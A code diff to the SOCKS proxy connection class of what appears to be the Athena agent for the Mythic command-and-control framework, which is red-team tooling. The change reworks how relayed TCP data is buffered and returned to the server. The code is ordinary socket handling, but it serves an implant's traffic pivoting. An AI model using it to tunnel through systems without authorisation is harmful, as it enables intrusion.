@@ -1,24 +1,36 @@
 ﻿using System;
 using System.IO;
+using System.Linq;
 using System.Net.Sockets;
 using System.Threading;
 using Athena.Models.Mythic.Response;
+using System.Collections.Generic;
 using Athena.Utilities;
+using System.Collections.Concurrent;
+using System.Threading.Tasks;
 
 namespace Athena.Models.Athena.Socks
 {
     public class AthenaSocksConnection : NetCoreServer.TcpClient
     {
         public int server_id { get; set; }
-        private bool exited { get; set; }
+        public bool exited { get; set; }
         ConnectionOptions co { get; set; }
+        byte[] messageOut { get; set; }
+        object _lock = new object();
 
-        public AthenaSocksConnection(ConnectionOptions co) : base(co.ip, co.port){
+        public AthenaSocksConnection(ConnectionOptions co) : base(co.ip, co.port) {
             this.server_id = co.server_id;
             this.co = co;
+            this.messageOut = new byte[0];
             this.exited = false;
-            this.OptionReceiveBufferSize = 15728640;
-            this.OptionSendBufferSize = 15728640;
+            this.OptionReceiveBufferLimit = 65530;
+            this.OptionReceiveBufferSize = 65530;
+            this.OptionSendBufferLimit = 65530;
+            this.OptionSendBufferSize = 65530;
+            this.OptionDualMode = true;
+            this.OptionNoDelay = true;
+            this.OptionKeepAlive = true;
         }
 
         public void DisconnectAndStop()
@@ -43,6 +55,7 @@ namespace Athena.Models.Athena.Socks
                 }.ToByte()).Result,
                 exit = false
             };
+
             Globals.socksHandler.ReturnMessage(smOut);
         }
 
@@ -53,36 +66,61 @@ namespace Athena.Models.Athena.Socks
             //https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.socket.receiveasync?view=net-7.0#system-net-sockets-socket-receiveasync(system-net-sockets-socketasynceventargs)
             //.NET 7 will support AsyncSocket stuff so I might be able to migrate to that.
             this.exited = true;
-            SocksMessage smOut = new SocksMessage() //Put together our Mythic Response
-            {
-                server_id = this.server_id,
-                data ="",
-                exit = true
-            };
-            Globals.socksHandler.ReturnMessage(smOut);
         }
 
         protected override void OnReceived(byte[] buffer, long offset, long size)
         {
-            //Should OnReceived add to an agent buffer and then return the entire thing as a message?
-            byte[] b = new byte[(int)size];
+            byte[] b = new byte[size];
+
+            Array.Copy(buffer, offset, b, 0, size);
             
-            using(MemoryStream stream = new MemoryStream(buffer)){
-                stream.Read(b, (int)offset, (int)size);
-            }
-            
-            SocksMessage smOut = new SocksMessage()
+            if(b.Length > 0)
             {
-                server_id = this.server_id,
-                data = Misc.Base64Encode(b).Result,
-                exit = exited
-            };
-            Globals.socksHandler.ReturnMessage(smOut);
+                lock (_lock)
+                {
+                    this.messageOut = AddByteArray(this.messageOut, b);
+                }
+            }
         }
 
         protected override void OnError(SocketError error)
         {
-            Console.WriteLine($"Chat TCP client caught an error with code {error}");
+            Console.WriteLine($"TCP client caught an error with code {error}");
+        }
+
+        public async Task<SocksMessage> GetServerMessage()
+        {
+            byte[] b = new byte[0];
+            
+            lock (_lock)
+            {
+                b = AddByteArray(b, this.messageOut);
+                this.messageOut = new byte[0];
+            }
+            
+            return new SocksMessage()
+            {
+                server_id = this.server_id,
+                data = await Misc.Base64Encode(b),
+                exit = this.exited
+            };
+        }
+
+        public async Task<bool> HasMessages()
+        {
+            if (this.messageOut.Length > 0 || this.exited)
+            {
+                return true;
+            }
+            return false;
+        }
+
+        private byte[] AddByteArray(byte[] first, byte[] second)
+        {
+            byte[] bytes = new byte[first.Length + second.Length];
+            Buffer.BlockCopy(first, 0, bytes, 0, first.Length);
+            Buffer.BlockCopy(second, 0, bytes, first.Length, second.Length);
+            return bytes;
         }
     }
 }
